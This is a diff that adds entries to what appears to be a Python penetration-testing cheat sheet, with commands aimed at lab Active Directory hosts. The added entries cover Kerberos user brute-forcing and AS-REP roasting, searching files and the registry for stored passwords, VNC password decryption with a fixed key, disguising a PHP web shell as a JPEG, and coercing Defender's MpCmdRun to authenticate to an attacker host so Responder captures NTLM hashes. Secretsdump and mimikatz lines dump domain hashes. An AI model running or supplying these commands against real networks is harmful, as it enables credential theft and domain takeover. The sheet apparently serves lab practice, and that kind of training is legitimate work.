@@ -561,7 +561,7 @@ old=$(ps -eo command)
 
 echo -e "Start at: $(date +%H:%M:%S)"
 while true; do
-		echo -ne "Now: $(date +%H:%M:%S)\r"
+		echo -ne "Now: $(date +%H:%M:%S)\\r"
 		new=$(ps -eo command)
 		diff <(echo "$old") <(echo "$new") | grep "[\<\>]" | grep -vE "croncheck.sh|command"
 		old=$new
@@ -1537,4 +1537,153 @@ wget https://github.com/ParrotSec/mimikatz/blob/master/x64/mimikatz.exe
 
 [*] Better way to get all Hash with impacket-secretsdump
 secretsdump.py egotistical-bank.local/fsmith@10.10.10.175
+"""
+
+######################################
+######################################
+
+goBuild = Cheat("go build flags")
+goBuild.category = "Tools"
+goBuild.output = """[*] Build an executable in go with flags to get a small binary
+
+go build -ldflags '-s -w' .
+upx executableFile
+"""
+
+######################################
+######################################
+
+kerbrute = Cheat("kerbrute / GetNPUsers.py - Enumerate Users from DC/AD Windows through Kerberos Pre-Authentication (AS-REP Roasting)")
+kerbrute.category = "Tools"
+kerbrute.output = """[*] KERBRUTE - A tool to quickly bruteforce and enumerate valid Active Directory accounts through Kerberos Pre-Authentication
+
+# Repository: https://github.com/ropnop/kerbrute
+git clone https://github.com/ropnop/kerbrute
+cd kerbrute
+go build -ldflags '-s -w' .
+upx kerbrute
+
+kerbrute userenum --dc 10.10.10.175 -d egotistical-bank.local -t 50 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+
+[*] Queries target domain for users with 'Do not require Kerberos
+preauthentication' set and export their TGTs for cracking
+
+GetNPUsers.py egotistical-bank.local/ -no-pass -usersfile users.txt
+"""
+
+######################################
+######################################
+
+defaultCredentials = Cheat("Search for passwords in Windows/AD/DC")
+defaultCredentials.category = "Windows"
+defaultCredentials.output = """[*] Search for “Password”
+
+#Search suspicious files from filename
+dir /s /W *pass* == *cred* == *vnc* == *.config* | findstr /i/v "\\\\windows"
+
+#Search suspicious files from content
+findstr /D:C:\ /si password *.xml *.ini *.txt #A lot of output can be generated
+findstr /D:C:\ /M /SI password *.xml *.ini *.txt 2>nul | findstr /V /I "\\\\AppData\\\\Local \\\\WinXsX ApnDatabase.xml \\\\UEV\\\\InboxTemplates \\\\Microsoft.Windows.CloudExperienceHost" 2>nul
+
+
+[*] Search Password in Registry
+
+# Autologin
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul  
+
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"
+reg query "HKCU\Software\ORL\WinVNC3\Password"
+reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
+reg query "HKCU\Software\TightVNC\Server"
+
+# Check the values saved in each session, user/password could be there
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s  
+reg query "HKCU\Software\OpenSSH\Agent\Key"
+
+# Search for passwords inside all the registry
+reg query HKLM /f password /t REG_SZ /s #Look for registries that contains "password"
+reg query HKCU /f password /t REG_SZ /s #Look for registries that contains "password"
+
+[*] With winPEAS.exe
+.\winPEAS.exe quiet filesinfo userinfo
+"""
+
+######################################
+######################################
+
+ldapsearch = Cheat("ldapsearch - LDAP search tool")
+ldapsearch.category = "Tools"
+ldapsearch.output = """[*] ldapsearch is a shell-accessible interface to the ldap_search_ext(3) library cal
+
+# sudo apt install ldap-utils
+ldapsearch -x -h 10.10.10.182 -b "dc=cascade,dc=local"
+ldapsearch -x -h 10.10.10.182 -b "dc=cascade,dc=local" | grep "@cascade.local"
+ldapsearch -x -h 10.10.10.182 -b "dc=cascade,dc=local" | grep "@cascade.local" -A 25
+ldapsearch -x -h 10.10.10.182 -b "dc=cascade,dc=local" | grep "@cascade.local" -A 25 | grep -Ei "userPrincipalName|pass|pwd"
+"""
+
+######################################
+######################################
+
+xxd = Cheat("xxd - Hexadecimal Editor - MIME")
+xxd.category = "Tools"
+xxd.output = """[*] xxd - Hexadecimal Editor
+
+# encode as Hexadecimal
+echo "Test" | xxd -ps
+
+# decode from Hexadecimal
+echo "546573740a" | xxd -ps -r
+
+[*] Change MIME Type of file...
+# https://en.wikipedia.org/wiki/List_of_file_signatures
+# This methode will overwrite first bytes...
+
+xxd -r -p -o 0 <(echo FF D8 FF DB) shell.php.jpg
+"""
+
+######################################
+######################################
+
+vncdecrypt = Cheat("VNC decrypt - oneliner")
+vncdecrypt.category = "Tools"
+vncdecrypt.output = """[*] Decrypt passwords stored in VNC files
+
+echo -n d7a514d8c556aade | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d
+"""
+
+######################################
+######################################
+
+socat = Cheat("socat - PortForwarding - localhost to remote host ipv6")
+socat.category = "Tools"
+socat.output = """[*] Socat - Multipurpose relay (SOcket CAT)
+[*] Socat  is  a command line based utility that establishes two bidirectional byte streams and transfers data between them
+
+socat TCP-LISTEN:445,fork TCP:dead:beef::b885:d62a:d679:573f:445
+"""
+
+######################################
+######################################
+
+mp_cmd_exe = Cheat("MpCmdRun.exe - Force Scan AntiVirus for Responder.py - AV - NTML")
+mp_cmd_exe.category = "Windows"
+mp_cmd_exe.output = """[*] MpCmdRun.exe - dedicated command-line tool of Microsoft Defender Antivirus
+
+# Prepare responder.py for catch NTML HASH
+sudo responder.py -I tun0 -v
+sudo responder.py -I tun0 --lm -v # for force get NTLMv1
+
+# Scan remote file
+.\MpCmdRun.exe -Scan -ScanType 3 -File \\\\10.10.14.21\\test.txt
+"""
+
+######################################
+######################################
+
+secredump = Cheat("secretsdump.py - ntds - ntlm - system - sam")
+secredump.category = "Tools"
+secredump.output = """[*] Get all hashes os all domain users
+
+secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
 """
